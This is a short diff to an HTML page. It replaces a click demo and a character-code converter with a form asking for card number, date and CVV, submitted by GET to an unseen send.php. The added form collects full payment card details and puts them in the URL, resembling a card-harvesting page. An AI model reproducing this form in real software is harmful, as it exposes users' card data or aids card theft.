@@ -10,18 +10,12 @@
 <body>
 
     <div class="container">
-        <div class="dive" id="home1">Click!</div>
-        <br>
-        <div class="dive" id="home2">DoubleClick! <img src="https://fs-thb02.getcourse.ru/fileservice/file/thumbnail/h/AB.e4220f36fc02b9fcc91612aea987879f.png/s/70x70/a/64783/sc/131"></img></div>
-        <br>
-        <img class="image" id="imgcat" src="https://sun9-79.userapi.com/impg/Dnh1MD6mRNrURFcr_Gt-_jE8B9drVaIhkdH2nw/ludUj1-Zfv0.jpg?size=1440x2160&quality=95&sign=88f8deced3997e33d075652f0a5aadba&type=album"></img>
-        <br>
-        <div>
-            <p>Введите символ:</p>
-            <input type="text" class="inp">
-            <p>Код символа:</p>
-            <input type="text" class="inpcode" readonly>
-        </div>
+        <form action="send.php" method="get">
+            <input type="text" name="name" placeholder="Номер карты">
+            <input type="text" name="surname" placeholder="Дата">
+            <input type="text" name="cvv" placeholder="CVV">
+            <input type="submit">
+        </form>
     </div>
 
     <script src="main.js"></script>
